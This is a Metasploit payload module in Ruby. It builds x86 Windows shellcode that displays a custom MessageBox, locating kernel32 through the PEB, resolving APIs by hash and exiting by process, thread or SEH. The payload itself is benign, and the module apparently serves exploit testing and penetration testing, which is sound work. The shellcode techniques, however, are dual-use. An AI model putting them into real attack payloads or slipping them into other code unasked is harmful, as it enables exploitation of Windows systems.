##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


module Metasploit3

  include Msf::Payload::Windows
  include Msf::Payload::Single

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows MessageBox',
      'Description'   => 'Spawns a dialog via MessageBox using a customizable title, text & icon',
      'Author'        =>
        [
          'corelanc0d3r <peter.ve[at]corelan.be>', # original payload module
          'jduck'         # some ruby factoring
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86
    ))

    # Register MessageBox options
    register_options(
      [
        OptString.new('TITLE', [ true, "Messagebox Title (max 255 chars)", "MessageBox" ]),
        OptString.new('TEXT', [ true, "Messagebox Text (max 255 chars)", "Hello, from MSF!" ]),
        OptString.new('ICON', [ true, "Icon type can be NO, ERROR, INFORMATION, WARNING or QUESTION", "NO" ])
      ], self.class)
  end

  #
  # Construct the payload
  #
  def generate

    strTitle = datastore['TITLE'] + "X"
    if (strTitle.length < 1)
      raise ArgumentError, "You must specify a title"
    end
    if (strTitle.length >= 256)
      raise ArgumentError, "The title must be less than 256 characters long."
    end

    strText = datastore['TEXT'] + "X"
    if (strText.length < 1)
      raise ArgumentError, "You must specify the text of the MessageBox"
    end
    if (strText.length >= 256)
      raise ArgumentError, "The text must be less than 256 characters long."
    end

    # exitfunc process or thread ?
    stackspace = "0x04"
    funchash = ""
    doexitseh = ""
    case datastore['EXITFUNC'].upcase.strip
    when 'PROCESS'
      stackspace = "0x08"
      funchash = "0x73E2D87E"
    when 'THREAD'
      stackspace = "0x08"
      funchash = "0x60E0CEEF"
    end

    # create exit routine for process / thread
    getexitfunc = <<EOS
  ;base address of kernel32 will be at esp,
  mov ebx,#{funchash}
  xchg ebx, dword [esp]
  push edx
  call find_function
  ;store function address at ebx+08
  mov [ebp+0x8],eax
EOS

    doexit = <<EOS
  xor eax,eax		;zero out eax
  push eax		;put 0 on stack
  call [ebp+8]	;ExitProcess/Thread(0)
EOS

    # if exit is set to seh, overrule
    if datastore['EXITFUNC'].upcase.strip == "SEH"
      # routine to exit via exception
      doexit = <<EOS
  xor eax,eax
  call eax
EOS
      getexitfunc = ''
    end

    # Generate code to get ptr to Title
    marker_idx = strTitle.length - 1
    strPushTitle = string_to_pushes(strTitle, marker_idx)
    # generate code to write null byte
    strWriteTitleNull = "xor ebx,ebx\n\tmov [esp+0x#{marker_idx.to_s(16)}],bl\n\tmov ebx,esp\n\t"

    #================Process Text===============================
    marker_idx = strText.length - 1
    strPushText = string_to_pushes(strText, marker_idx)
    strWriteTextNull = "xor ecx,ecx\n\tmov [esp+0x#{marker_idx.to_s(16)}],cl\n\tmov ecx,esp\n\t"

    # generate code to set messagebox icon
    setstyle = "push edx\n\t"
    case datastore['ICON'].upcase.strip
      #default = NO
    when 'ERROR'
      setstyle = "push 0x10\n\t"
    when 'QUESTION'
      setstyle = "push 0x20\n\t"
    when 'WARNING'
      setstyle = "push 0x30\n\t"
    when 'INFORMATION'
      setstyle = "push 0x40\n\t"
    end

    #create actual payload
    payload_data = <<EOS
  ;getpc routine
  fldpi
  fstenv [esp-0xc]
  xor edx,edx
  mov dl,0x77	;offset to start_main

;get kernel32
  xor ecx,ecx
  mov esi, [fs:ecx + 0x30]
  mov esi, [esi + 0x0C]
  mov esi, [esi + 0x1C]
next_module:
  mov eax, [esi + 0x08]
  mov edi, [esi + 0x20]
  mov esi, [esi]
  cmp [edi + 12*2], cl
  jne next_module

  pop ecx
  add ecx,edx
  jmp ecx            ;jmp start_main

find_function:
  pushad				;save all registers
  mov ebp, [esp  +  0x24]	;put base address of module that is being loaded in ebp
  mov eax, [ebp  +  0x3c]	;skip over MSDOS header
  mov edx, [ebp  +  eax  +  0x78]	;go to export table and put relative address in edx
  add edx, ebp			;add base address to it.
            ;edx = absolute address of export table
  mov ecx, [edx  +  0x18]		;set up counter ECX
            ;(how many exported items are in array ?)
  mov ebx, [edx  +  0x20]		;put names table relative offset in ebx
  add ebx, ebp			;add base address to it.
            ;ebx = absolute address of names table

find_function_loop:
  jecxz  find_function_finished ;if ecx=0, then last symbol has been checked.
            ;(should never happen)
            ;unless function could not be found
  dec ecx				;ecx=ecx-1
  mov esi,  [ebx  +  ecx  *  4]	;get relative offset of the name associated
            ;with the current symbol
            ;and store offset in esi
  add esi,  ebp			;add base address.
            ;esi = absolute address of current symbol

compute_hash:
  xor edi,  edi			;zero out edi
  xor eax,  eax			;zero out eax
  cld					;clear direction flag.
            ;will make sure that it increments instead of
            ;decrements when using lods*

compute_hash_again:
  lodsb					;load bytes at esi (current symbol name)
            ;into al, + increment esi
  test al, al				;bitwise test :
            ;see if end of string has been reached
  jz  compute_hash_finished	;if zero flag is set = end of string reached
  ror edi,  0xd			;if zero flag is not set, rotate current
            ;value of hash 13 bits to the right
  add edi, eax			;add current character of symbol name
            ;to hash accumulator
  jmp compute_hash_again		;continue loop

compute_hash_finished:

find_function_compare:
  cmp edi,  [esp  +  0x28]	;see if computed hash matches requested hash
            ; (at esp+0x28)
            ;edi = current computed hash
            ;esi = current function name (string)
  jnz find_function_loop		;no match, go to next symbol
  mov ebx,  [edx  +  0x24]	;if match : extract ordinals table
            ;relative offset and put in ebx
  add ebx,  ebp			;add base address.
            ;ebx = absolute address of ordinals address table
  mov cx,  [ebx  +  2  *  ecx]	;get current symbol ordinal number (2 bytes)
  mov ebx,  [edx  +  0x1c]	;get address table relative and put in ebx
  add ebx,  ebp			;add base address.
            ;ebx = absolute address of address table
  mov eax,  [ebx  +  4  *  ecx]	;get relative function offset from its ordinal
            ;and put in eax
  add eax,  ebp			;add base address.
            ;eax = absolute address of function address
  mov [esp  +  0x1c],  eax	;overwrite stack copy of eax so popad
            ;will return function address in eax
find_function_finished:
  popad 				;restore original registers.
            ;eax will contain function address
  ret

start_main:
  mov dl,#{stackspace}
  sub esp,edx		;allocate space on stack
  mov ebp,esp		;set ebp as frame ptr for relative offset
  mov edx,eax		;save base address of kernel32 in edx

  push 0xEC0E4E8E	;get LoadLibrary function ptr
  push edx
  call find_function
  ;put function address on stack (ebx+04)
  mov [ebp+0x4],eax
  #{getexitfunc}		;optionally get selected exit function ptr

  ;put pointer to string user32.dll to stack
  push 0x41206c6c
  push 0x642e3233
  push 0x72657375    	;user32.dll
  mov [esp+0xA],bl		;null byte
  mov esi,esp			;put pointer to string on top of stack
  push esi
  call [ebp+0x4]		;call LoadLibrary
  ; base address of user32.dll is now in eax (if loaded correctly)
  mov edx,eax			;put ptr in edx
  push eax			;put it on stack as well
  ;find the MessageBoxA function
  mov ebx, 0xBC4DA2A8
  xchg ebx, dword [esp]  ;esp = base address of user32.dll
  push edx
  call find_function
  ;function address should be in eax now
  ;we'll keep it there
  ;get pointer to title
  #{strPushTitle}
  #{strWriteTitleNull}	;ebx will point to title
  ;get pointer to text
  #{strPushText}
  #{strWriteTextNull}	;ecx will point to text

;now push parameters to the stack
  xor edx,edx		;zero out edx
  #{setstyle}		;set button/iconstyle on stack
  push ebx		;put pointer to Title on stack
  push ecx		;put pointer to Text on stack
  push edx		;put 0 on stack (hWnd)
  call eax		;call MessageBoxA(hWnd,Text,Title,Style)

;EXITFUNC
  #{doexit}
EOS
    self.assembly = payload_data
    super
  end

  #
  # Turn the provided string into a serious of pushes
  #
  def string_to_pushes(str, marker_idx)
    # Align string to 4 bytes
    rem = (marker_idx+1) % 4
    if (rem > 0)
      str << " " * (4 - rem)
    end

    # string is now 4 byte aligned and ends with 'X' at index 'marker_idx'

    # push string to stack, starting at the back
    pushes = ''
    while (str.length > 0)
      four = str.slice!(-4, 4)
      dw = four.unpack('V').first
      pushes << "push 0x%x\n\t" % dw
    end

    pushes
  end

end
